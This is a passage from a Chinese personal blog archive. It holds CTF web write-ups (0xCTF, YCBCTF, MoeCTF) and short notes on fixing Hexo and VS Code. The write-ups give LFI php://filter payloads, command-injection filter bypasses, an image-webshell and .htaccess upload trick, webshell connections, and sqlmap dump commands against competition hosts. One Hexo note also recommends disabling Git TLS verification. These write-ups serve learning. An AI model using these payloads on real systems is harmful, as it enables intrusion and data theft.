<p>所以将上述payload中的file参数修改为action 即可，不不不，事情没有这么简单，我尝试了一下，直接404，好吧，貌似是index.php中并没有action 这个参数，所以应该在action.php 的基础上再去使用php://filter语句，故修改payload为：</p>
<pre><code class="line-numbers language-php">http://ctf.caoyi.site:30002/web8/action.php?action=php://filter/read=convert.base64-encode/resource=fl4g.php
</code></pre>
<p>访问一下，一串base64编码后的字符串一闪而过，然后页面又变成了留言板界面，此时想到的是抓包，使用Burpsuite抓包后发现可疑字符串</p>
<img src="/2020/07/05/0xctf/image-20200711140844022.png" alt="image-20200711140844022" style="zoom: 33%;">

<p>base64解码后即可得到flag</p>
<hr>
<h4 id="16-RCE-bypass"><a href="#16-RCE-bypass" class="headerlink" title="16.RCE bypass"></a>16.RCE bypass</h4><img src="/2020/07/05/0xctf/image-20200716214515665.png" alt="image-20200716214515665" style="zoom:67%;">

<p>这道题前前后后花了些时间，一开始无从下手，题目标题是RCE绕过，关于RCE绕过的姿势也了解了一些（此处安利一篇博客：<a href="https://cloud.tencent.com/developer/article/1599149">《RCE的Bypass与骚姿势总结》</a>），但完全无从下手。前期试了试get方式传一个cmd参数，我试了一下<code>？cmd=1</code>,并没有什么用。后来大佬建议我去了解一下php system 函数，了解了一波后，再结合刚学的Linux命令，想起来攻防世界里的一句话木马那道题当时有个wp就是采用system+cat来解决的。我踌躇满志地打开hackbar, load Url,post date:<code>shell=system('ls');</code>，然而又是啥都没。一番挣扎尝试后再次求助大佬，经过大佬的点播与提示，上述php语句中有两句话应该好好理解：</p>
<pre><code class="line-numbers language-php">$cmd = $_GET['cmd']?$_GET['cmd']:'';
</code></pre>
<p>这句话y中用到了三目运算符？：，如果问号前面的条件成立的话，那么它就执行问号与冒号之间的语句，否则执行冒号后面的语句.</p>
<p>那么这句话的意思就是如果以get方式传入了参数的话，那么他就把这个传入的cmd参数赋值给 $cmd,如果没有传入cmd这个参数的话，那么 cmd就为空。</p>
<pre><code class="line-numbers language-php">if($cmd)
{   system("$cmd"); }
</code></pre>
<p>这个语句表明php用system 函数把cmd这个参数当做系统命令执行，所以其实之前尝试的<code>shell=system('ls');</code>可以以在url 里将cmd 赋值为ls 来代替实现，</p>
<img src="/2020/07/05/0xctf/image-20200716221117992.png" alt="image-20200716221117992" style="zoom:67%;">

<p>此时页面中出现了flag.php和index.php的提示，此时想到利用cmd=cat flag.php的方式来读取文件，但是cat,flag被禁用了，第一时间想到的是用姿势绕过，但大佬说duck不必，<strong>cat被ban了可以用tac，tac被ban 了可以用head，head被ban了还可以用其他的</strong>。一语惊醒梦中人呐，之前在学习Linux命令的时候，的确很多命令都可以完成文件的读取工作。</p>
<blockquote>
<p><strong>小小整理一下，若cat被ban,可以采用以下命令代替：</strong></p>
<p>(1)more:一页一页的显示档案内容 </p>
<p>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页 （补充一下，如果想退出less，按q键就可以了）</p>
<p>(3)head:查看头几行 (默认是前10行)</p>
<p>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 </p>
<p>(5)tail:查看尾几行 （默认是后10行）</p>
<p>(6)nl：显示的时候，顺便输出行号 </p>
<p>(7)od:以二进制的方式读取档案内容 </p>
<p>(8)vi:一种编辑器，这个也可以查看</p>
<p>(9)vim:一种编辑器，这个也可以查看</p>
<p>(10)sort:可以查看 </p>
<p>(11)uniq:可以查看</p>
<p>(12)file -f:报错出具体内容   For example:<img src="/2020/07/05/0xctf/image-20200717092841793.png" alt="image-20200717092841793"></p>
<p>关于如何退出vim（命令模式下）</p>
<p>:q，退出(:quit的缩写)</p>
<p>:qL,退出且不保存(:quit的缩写)</p>
<p>:wq,保存并退出</p>
<p>:wq!，保存并退出即使文件没有写入权限(强制保存退出)</p>
<p>:x,保存并退出(类似:wq，但是只有在有更改的情况下才保存):exit,保存并退出(和:x相同)</p>
<p>:qa，退出所有(:quitall的缩写)</p>
<p>:cq，退出且不保存(即便有错误)</p>
</blockquote>
<p>尝试采用tail代替cat，下面应该把flag绕过就ok了，构造如下payload：<code>?cmd=tail fl''ag.php</code>,发现页面没有出现<strong>爪巴</strong>，估计是成功绕过了。</p>
<p>大佬友情提醒，文件内容含有&lt;??&gt;的不会在前端输出，需要查看源码。（由于&lt;??&gt;在前端并不显示，所以此处采用的是编码来让其显示，&lt;在html中可用<code>&amp;lt</code>加上<code>；</code>来显示，同理，&gt;用<code>&amp;gt</code>加<code>；</code>来显示，一定别忘了<code>；</code><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8">😢</span>，更多的这样的转义符可以去百度一下）</p>
<p>查看一波源码，成功得到flag</p>
<p>（这里再插几句，关于那个flag的绕过方式，其实fl*这种也很常见,即通配符绕过</p>
<p>此处再安利一篇博文：<a href="https://www.cnblogs.com/SpouseLJ/p/13223967.html#xcjwjDZd">《CTF下的命令执行漏洞利用及绕过方法总结》</a>。</p>
<p>但是让我很苦恼的是那种拼接方式去构造payload的方式我可能还不太理解，在本题中尝试了好多次也没成功，这个坑先留着，以后来填，或者大佬们评论区指点一波</p>
<p>）</p>
<hr>
<h4 id="17-RCE-bypass-pro"><a href="#17-RCE-bypass-pro" class="headerlink" title="17.RCE_bypass_pro"></a><strong>17.RCE_bypass_pro</strong></h4><img src="/2020/07/05/0xctf/image-20200720210307946.png" alt="image-20200720210307946" style="zoom:50%;">

<p>这道题是RCE的pro版本，料到了绕过有难度。点进去一看，我敲！这么多过滤条件！（手动滑稽_）</p>
<p>稍微理解一下源码：首先要以<code>GET</code>方式传一个<code>ip</code>参数，然后那一长串用于过滤的令人头皮发麻的正则表达式，emmm，怎么说呢，没能完全看懂，但大致能晓得它过滤掉了哪些东西。</p>
<p>先稍微试一试水，我构造了这样一个<code>payload:?ip=d;sort${IFS}fl\ag.php</code></p>
<p>失败，回显  <strong>fxck your symbol!</strong></p>
<p>又仔细看了看，好吧，疏忽了，<code>{}</code>、<code>/</code>貌似都被过滤了，额，<code>{}</code>好解决，空格用<code>$IFS</code>也可以替代，但是flag咋搞呢？</p>
<p>百度了一波，大概要么编码解决，要么用拼接（哎，终究逃不过拼接<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f630.png?v8">😰</span>）</p>
<p>尝试一波拼接 <img src="/2020/07/05/0xctf/image-20200720214759811.png" alt="image-20200720214759811" style="zoom:67%;"></p>
<p>再次失败，不过这次回显的是  <strong>no flag</strong>,对照源码，应该是咱们的flag没成功绕过，还是被过滤了。</p>
<p>继续百度，我恰巧看到一篇博客里提到了<code>if(preg_match("/.*f.*l.*a.*g.*/", $ip)</code>这个正则表达式，他说这个过滤的话采用一般的拼接不起作用，得换换顺序，因为一旦 f l a g顺序显示，就歇菜了。</p>
<p>OK,那将a,b换换吧，重新构造payload:<img src="/2020/07/05/0xctf/image-20200720215305374.png" alt="image-20200720215305374" style="zoom: 67%;"></p>
<p>成功！！<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8">😎</span></p>
<p>然后我又尝试了一下其他的payload，应该不止这一种解法。继续逛百度，居然发现一道和这道题很像的题<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f632.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f632.png?v8">😲</span></p>
<p>去找了找它的wp，由于题目还是有点差异，有些wp中的解法并没成功（也可能是我太菜了<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f635.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f635.png?v8">😵</span>），但是经过我的尝试，还是发现了几种骚姿势：</p>
<ul>
<li><img src="/2020/07/05/0xctf/image-20200720220319905.png" alt="image-20200720220319905"></li>
</ul>
<ul>
<li><img src="/2020/07/05/0xctf/image-20200720220434968.png" alt="image-20200720220434968"></li>
</ul>
<p>第二个实在是太骚了，运行后：</p>
<img src="/2020/07/05/0xctf/image-20200720220938545.png" alt="image-20200720220938545" style="zoom:80%;">

<p>菜鸡的我流下了伤心的泪水<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span><span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span></p>
<hr>
<h4 id="18-EZupload-2"><a href="#18-EZupload-2" class="headerlink" title="18.EZupload-2"></a>18.EZupload-2</h4><img src="/2020/07/05/0xctf/image-20200731115817516.png" alt="image-20200731115817516" style="zoom:67%;">

<p>依旧是一道文件上传，首先尝试一波上传shell.php,(让自己死心），回显不允许的文件类型。</p>
<p>又尝试了一波双写绕过，加.绕过，都不行，想了一下可能是得上传图片马，首先制作一个图片马：</p>
<p>首先桌面新建一个shell.php文件，写入一句话木马。</p>
<p>然后打开cmd,用<code>cd desktop</code>定位到桌面,<code>copy 1.jpg/b+shell.php/a 3.jpg</code>（前提是你桌面上有1.jpg这张图和shell.php）</p>
<p>用记事本打开3.jpg，将乱码拉倒最后，如果最后有一句话木马就说明制作成功了。（必要的情况下可以把乱码删掉，乱码太多后续可能解析不了）</p>
<p>图片马制作成功，然后也上传成功，但是菜刀和蚁剑都连不上，几番百度，也没发现问题。后来去问大佬，大佬说图片马没办法像php那样被解析，有两种方法：</p>
<ul>
<li><p>文件包含            </p>
</li>
<li><p>.htaccess</p>
<p>似乎豁然开朗，但是我之前上传.htaccess文件的时候它显示不允许的文件类型，大佬说抓包改一下文件类型就可以了（奥，我想起来，之前做那个靶场训练的时候好像遇到过这种题）</p>
<p>此处我当时踩了一个大坑，我的.htaccess文件命名成了1.htaccess，但是其实是不能有文件名的，那个文件直接命名成.htaccess就可</p>
<p>然后关于.htaccess的内容，第一种写法：<code>SetHandler application/x-httpd-php</code></p>
<p>然后还有一种更精准的写法：</p>
<pre><code> &lt;FilesMatch "shell.jpg"&gt;
  SetHandler application/x-httpd-php
 &lt;/FilesMatch&gt;
</code></pre>
<p>（当然这种写法你的图片马的文件名得是shell.jpg）</p>
<img src="/2020/07/05/0xctf/image-20200731122831238.png" alt="image-20200731122831238" style="zoom:67%;"></li>
</ul>
<p>把上面那个文件类型改成<code>image/jpeg</code> 再发包就可了</p>
<img src="/2020/07/05/0xctf/image-20200731123111676.png" alt="image-20200731123111676" style="zoom:67%;">

<p>上传成功！</p>
<p>接着再上传之前的图片木马，上传成功后回显一个地址，访问一波。</p>
<img src="/2020/07/05/0xctf/image-20200731124839807.png" alt="image-20200731124839807" style="zoom:50%;">

<p>应该是成功解析了，这时候将url用蚁剑链接一波，成功链接，然后成功在根目录下找到flag.<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f619.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f619.png?v8">😙</span></p>
<hr>
<h4 id="19-SQL-injection"><a href="#19-SQL-injection" class="headerlink" title="19.SQL_injection"></a>19.SQL_injection</h4><p>这是一道SQL注入的问题，应该不是很难。之前刷过几道sqllib的题，有空一定好好刷.</p>
<p>之前我采用的一直是手工注入，这次一开始也是采用的手工注入，但是出了些问题，后来转向sqlmap,由于我之前的sqlmap文件夹貌似又双叒叕被我误删了，这次使用的是kali自带的sqlmap。</p>
<ul>
<li>第一步，看是否存在注入点：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1' "</code></li>
</ul>
<img src="/2020/07/05/0xctf/image-20200928161245282.png" alt="image-20200928161245282" style="zoom: 67%;">

<p>提示“id”可能是注入点。</p>
<ul>
<li>第二步查看数据库名称：<code>kcm@kali:~$ sqlmap -u"http://59.110.157.4:30010/?id=1' " --dbs</code></li>
</ul>
<img src="/2020/07/05/0xctf/image-20200928161505584.png" alt="image-20200928161505584" style="zoom:67%;">

<p>显示有两个可用的数据库，一个名为 <strong>information_schema</strong>(信息模式？)，另一个名为<strong>user</strong>.</p>
<ul>
<li><p>知道了数据库的名称，接下来就是去查看数据库中的表：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1' " -D information_schema --tables</code></p>
<img src="/2020/07/05/0xctf/image-20200928161847157.png" alt="image-20200928161847157" style="zoom:67%;"></li>
</ul>
<p>自上而下看了半天，没发现flag字眼，暂且搁置，去另一个库康康：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1' " -D information_schema --tables</code></p>
<img src="/2020/07/05/0xctf/image-20200928162050230.png" alt="image-20200928162050230" style="zoom:67%;">

<p>只有简简单单的一个表，很可疑啊，觉得有必要深究一下。</p>
<ul>
<li><p>查看user数据库中user表的列信息：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1'" -D user -T user  --columns</code></p>
<img src="/2020/07/05/0xctf/image-20200928162328554.png" alt="image-20200928162328554" style="zoom:67%;">

<ul>
<li>最后查看你想看的东西就行了，falg应该是字符串，所以我首先查看的是password里的东西：<code>kcm@kali:~$ sqlmap -u "http://59.110.157.4:30010/?id=1'" -D user -T user -C password  --dump</code></li>
</ul>
<img src="/2020/07/05/0xctf/Users/28294/Desktop/无标题.png" alt="无标题" style="zoom:67%;">

<p>flag手动打码<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8">😜</span></p>
</li>
</ul>
<hr>
<p>未完待续<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f61c.png?v8">😜</span></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>博客发布时 hexo d 命令报错</title>
    <url>/2021/03/17/GitQues/</url>
    <content><![CDATA[<p>hexo 博客在hexo d 部署时报错</p>
<p>问题描述：</p>
<p>博客闲置了一段时间，最近想在上面记录一些自己遇到的问题和学习上的一些东西，<code>hexo s</code>正常，但是<code>hexo g</code>后进行<code>hexo d</code>时报错：</p>
<p><code>fatal: unable to access ‘https: [//github.com/***](https://github.com/***)’: Failed to connect to [github.com](http://github.com/) port 443:Timed out</code></p>
<p>起初我再执行几次<code>hexo d</code>就可以正常部署了，我也没有在意。但昨天晚上怎么试都不行，就想彻底解决一下。去网上找了很多方法试了都不太行，后来通过下面这两篇博客里的方法进行尝试成功将问题解决，在此记录一下。其实就是将我们的博客重新部署到Github上。（当然，方法不一定适用与每一个人，但应该是一种解决方法）</p>
<p><a href="https://blog.csdn.net/weixin_30940783/article/details/99581061?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-4.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-4.control">针对github权限导致hexo部署失败的解决方案</a></p>
<p><a href="https://blog.csdn.net/qq_43768946/article/details/90411154">Git使用出现git@github.com: Permission denied (publickey). 处理</a></p>
<hr>
<p>emmm,在准备把这篇博客部署的时候hexo d 又报错了，无语了。上面的方法仅供参考吧，今天我找到一种可行的方法。（至少暂时还没翻车）</p>
<p><a href="https://sevencho.github.io/archives/8e3becb8.html">记一次Hexo博客部署缓慢的解决办法</a></p>
<p>加油，打工人！</p>
<p>更新：</p>
<p><a href="https://segmentfault.com/a/1190000018624911?utm_source=tag-newest">https://segmentfault.com/a/1190000018624911?utm_source=tag-newest</a></p>
<p>按照这篇文章中说的方法一也可以解决该问题：</p>
<p>取消http代理：</p>
<pre><code class="line-numbers language-shell">$ git config --global --unset http.proxy
$ git config --global --unset https.proxy
</code></pre>
<p>设置env <code>GIT_SSL_NO_VERIFY</code>为<code>true</code>然后再次部署：</p>
<pre><code class="line-numbers language-shell">$ env GIT_SSL_NO_VERIFY=true hexo d
</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Hexo部署</tag>
      </tags>
  </entry>
  <entry>
    <title>Vscode_Error</title>
    <url>/2023/08/06/Vscode-Error/</url>
    <content><![CDATA[<h3 id="一、问题概述"><a href="#一、问题概述" class="headerlink" title="一、问题概述"></a>一、问题概述</h3><blockquote>
<p>vscode 获取扩展失败，XHR failed</p>
</blockquote>
<p>平时vscode只是用来跑一跑C/C++代码，最近想装一个插件的时候在插件商店搜索的时候却报错XHR failed，然后在网上查了查，似乎是连不上网，可能是代理出了问题。这才想起来似乎vscode好久没有给我推过版本更新或者推荐插件什么的了，可能是无法联网的原因。</p>
<h3 id="二、解决方法"><a href="#二、解决方法" class="headerlink" title="二、解决方法"></a>二、解决方法</h3><p>网上的解决方法是修改vscode里的设置，将代理移除，但是我按照这种方法并不奏效。</p>
<p><a href="https://blog.csdn.net/SUDA196/article/details/127104495">Win10解决vscode获取扩展失败，XHR failed（亲测可以解决）_苏打不会碱的博客-CSDN博客</a></p>
<p>后来在查找解决方法的时候偶然发现了这篇文章：</p>
<p><a href="https://www.cnblogs.com/joyzen/p/13815384.html">VS Code代理设置错误 - 许你一世煙花 - 博客园 (cnblogs.com)</a></p>
<p>里面提到：</p>
<blockquote>
<p>VS Code会去读取系统变量HTTP_PROXY的值设置为代理地址，去查了下系统环境变量设置里面果真有这个变量，删除后即可解决VS Code商店连不上的问题</p>
</blockquote>
<p>按照他的方法我确实在电脑上找到了HTTP＿PROXY（我的是小写）这个系统变量，并且它的值是127.0.0.1:32100(可能是这样，删的果断了点没太记住)。按道理来说我的代理的端口是7890，显然他这里的端口值不太对，我没有去修改而是直接删除了这个变量。</p>
<p>删除后我尝试重启vscode，试了下发现还是连不上网，发现是因为我的vscode设置中设置了代理<code>http://127.0.0.1:7890</code>，但是我此时并没有开启代理，将代理开启后就可以正常联网了。</p>
<p><img src="https://aband0n.oss-cn-nanjing.aliyuncs.com/img/image-20230806154211788.png" alt="image-20230806154211788"></p>
<p>当然，如果不想开代理的话就将上面的<code>http://127.0.0.1:7890</code>删除，这样不开代理的情况下也可以正常联网。</p>
<h3 id="三、意外收获"><a href="#三、意外收获" class="headerlink" title="三、意外收获"></a>三、意外收获</h3><p>上面那篇文章中还提到了一点：</p>
<blockquote>
<p>同时还发现HTTP_PROXY这个环境变量还被被其他软件环境读取作为代理地址，比如yarn，造成依赖下载被代理到指定地址导致失败。</p>
</blockquote>
<p>其他软件也会读取HTTP_PROXY这个环境变量作为代理地址，突然想起之前自己电脑在使用群晖chat（Synology chat）的时候客户端一直无法正常登录，但是使用虚拟机或者其他人的电脑就可以正常登录，很奇怪，当时怀疑是自己电脑某个端口或者设置导致的，但是在网上搜索了很久都没有找到解决方案，一直搁置，使用的网页版。</p>
<p>所以我突然想到会不会当时无法登录也是因为这个环境变量呢？抱着试一试的心态打开客户端登录了一下，发现居然登陆成功了！害人不浅啊这个环境变量！<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span></p>
<p>所以如果你有某些软件一直登录不成功，不妨也检查一下自己的环境变量。</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>报错处理</category>
      </categories>
      <tags>
        <tag>Vscode</tag>
        <tag>Synology</tag>
      </tags>
  </entry>
  <entry>
    <title>YCBCTF wp</title>
    <url>/2020/09/10/YCBCTF/</url>
    <content><![CDATA[<p>“羊城杯”，开学后打的一场比赛，由于我实在是太菜了，只会写第一题<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8">😭</span></p>
<span id="more"></span>

<p>尝试访问一波index.php，页面出现<code>eval post cmd</code>,貌似是一句话木马。</p>
<img src="/2020/09/10/YCBCTF/image-20200910224747632.png" alt="image-20200910224747632" style="zoom:50%;">



<p>尝试用蚁剑连接一下，密码试一下cmd,连接成功！</p>
<img src="/2020/09/10/YCBCTF/image-20200910224833992.png" alt="image-20200910224833992" style="zoom:50%;">



<p>并没有找到flag.php或者含flag字样的东西，倒是发现一个bbbbbbbbb.txt，十分可疑，下载后打开发现是一堆奇奇怪怪的字符。想到可能是图片编码，尝试反向解码。找一个解码网站，将txt中的内容复制进去，显示格式错误。后来了解到要解码还得在前面加上一小串东西：<strong>data:image/jpg;base64,</strong>    解码成功！flag就在图片中，奇怪的知识又增加了<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8">😄</span>。</p>
<p><img src="/2020/09/10/YCBCTF/image-20200910224632204.png" alt="image-20200910224632204"></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo matery主题代码高亮问题</title>
    <url>/2020/09/26/hexo/</url>
    <content><![CDATA[<p>关于matery主题代码高亮的问题</p>
<p>转载自大佬们的博客:</p>
<p><a href="https://www.jianshu.com/p/f395d92a1110">Hexo博客：六、prism代码高亮</a></p>
<p><a href="https://blog.csdn.net/zemprogram/article/details/104421008">个人博客搭建笔记—-hexo主题代码高亮</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo 代码高亮 matery</tag>
      </tags>
  </entry>
  <entry>
    <title>MoeCTF wp</title>
    <url>/2020/08/14/moectf/</url>
    <content><![CDATA[<img src="/2020/08/14/moectf/image-20200816135721888.png" alt="image-20200816135721888" style="zoom:50%;">

<p>MoeCTF，西安电子科技大学的新生赛，作为一个南邮的小菜鸡，成功通过wh1sper师傅提供的后门混入其中:wink:，借此锻炼锻炼自己的能力，同时也为0xGame做准备。冲冲冲！</p>
<span id="more"></span>

<h4 id="1-GET"><a href="#1-GET" class="headerlink" title="1.GET"></a>1.GET</h4><p>这是一道简单的get传参的题，直接在url里传a这个参数<code>?a=flag</code>，即可得到flag</p>
<hr>
<h4 id="2-POST"><a href="#2-POST" class="headerlink" title="2.POST"></a>2.POST</h4><p>这是一道简单的post传参的题，利用hackbar（火狐浏览器的插件，不了解的话可自行百度一下，安装啥的不难的）即可传参，或者利用bp应该也是一样的。</p>
<img src="/2020/08/14/moectf/image-20200814140353992.png" alt="image-20200814140353992" style="zoom:50%;">

<hr>
<h4 id="3-小饼干"><a href="#3-小饼干" class="headerlink" title="3.小饼干"></a>3.小饼干</h4><p>进入页面发现是一个空页面，这时候想到利用bp抓包，观察</p>
<img src="/2020/08/14/moectf/image-20200814140801922.png" alt="image-20200814140801922" style="zoom: 67%;">

<p>发现类似flag的东西。复制提交，发现就是正确的flag</p>
<hr>
<h4 id="4-Introduction"><a href="#4-Introduction" class="headerlink" title="4.Introduction"></a>4.Introduction</h4><p>这个题点进去的话就是很正常的对<strong>moectf</strong>的介绍，点进去源码也没看到flag     (好吧，是我眼瞎，后来才发现flag就在源码里)  尝试抓包，也没找到</p>
<img src="/2020/08/14/moectf/image-20200814142428514.png" alt="image-20200814142428514" style="zoom: 67%;">

<p>考的是眼力:imp:</p>
<hr>
<h4 id="5-一句话木马"><a href="#5-一句话木马" class="headerlink" title="5.一句话木马"></a>5.一句话木马</h4><p>进入题目，发现源码就是一句话木马</p>
<img src="/2020/08/14/moectf/image-20200814142846791.png" alt="image-20200814142846791">

<p>话不多说，直接掏出俺的<strong>蚁剑</strong></p>
<img src="/2020/08/14/moectf/image-20200814143147631.png" alt="image-20200814143147631" style="zoom: 50%;">

<p>这边的话要注意的就是连接密码一定别忘记，<strong>密码就是post后面单引号里的内容</strong>。</p>
<img src="/2020/08/14/moectf/image-20200814143913525.png" alt="image-20200814143913525" style="zoom: 50%;">

<p>连接成功！一般情况下flag就在根目录/下，去到这道题的根目录下的确发现了flag。</p>
<hr>
<h4 id="6-ezmath"><a href="#6-ezmath" class="headerlink" title="6.ezmath"></a>6.ezmath</h4><p>等待填坑</p>
<hr>
<h4 id="7-三心二意"><a href="#7-三心二意" class="headerlink" title="7.三心二意"></a>7.三心二意</h4><p>根据hint及观察代码，这应该是一道考察php弱类型相等的题。</p>
<pre><code class="line-numbers language-php">&lt;?php
$a = $_GET['a'];
$b = $_POST['b'];
$c = $_REQUEST['c'];
$d = $_COOKIE['d'];

if (!isset($a, $b, $c, $d)) {
    highlight_file(__FILE__);
} else {
    if (is_numeric($a) and $a == false) {
        echo 'A is OK!';
        echo '&lt;br/&gt;';
        if (!is_numeric($b) and $b == 0x125e591) {
            echo 'B is OK!';
            echo '&lt;br/&gt;';
            if ($c != 240610708 and md5($c) == md5(240610708)) {
                echo 'C is OK!';
                echo '&lt;br/&gt;';
                if (strlen($d) &lt; 7 and $d != 0 and $d ** 2 == 0) {
                    include('/flag');
                } else {
                    echo "D is not wanted.&lt;br/&gt;";
                    highlight_file(__FILE__);
                }
            } else {
                echo "C is not wanted.&lt;br/&gt;";
                highlight_file(__FILE__);
            }
        } else {
            echo "Too young too simple.&lt;br/&gt;";
            highlight_file(__FILE__);
        }
    } else {
        echo "A is not wanted.&lt;br/&gt;";
        highlight_file(__FILE__);
    }
} 
</code></pre>
<p>u1s1,我刷题的确太少了，对于题目中的几个判断都不是很熟悉，不知道怎么去绕过，一个一个做解释吧:cry:</p>
<ul>
<li><code>is_numeric($a) and $a == false</code></li>
</ul>
<p>此处涉及到**is_numeric()**这个php函数,<strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串,如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。</p>
<p>也就是说上面这个语句要求a参数是一个数字或字符串，且==false，那挺简单的，0或者null都可以，尝试?a=0,回车一下发现没反应，仔细看源码才发现他要a,b,c,d四个变量都存在才行。</p>
<ul>
<li><p><code>!is_numeric($b) and $b == 0x125e591</code></p>
<p>这个语句的要求是b变量不是数字或字符串并且b==0x125e591，关于0x125e591，我也不太清楚他是个啥，看起来像16进制，百度一波</p>
<img src="/2020/08/14/moectf/image-20200921134750652.png" alt="image-20200921134750652" style="zoom:50%;">

<p>好家伙！直接给我转换出来了。没错了，0x125e591是16进制，转成10进制就是19260817。</p>
<blockquote>
<p>php有两种比较方式,一种是“= =”一种是“= = =”</p>
<p>“= =”：会把两端变量类型转换成相同的，再进行比较。</p>
<p>“= = =”：会先判断两端变量类型是否相同，再进行比较。</p>
<p>这里明确说明，<strong>在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值</strong>。</p>
<p>当一个字符串被当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内，该字符串被当作int来取值。其他所有情况下都被作为float来取值，<strong>该字符串的 开始部分 决定了它的值，如果该字符串以合法的数值开始，则使用该数值， 否则其值为0 。</strong></p>
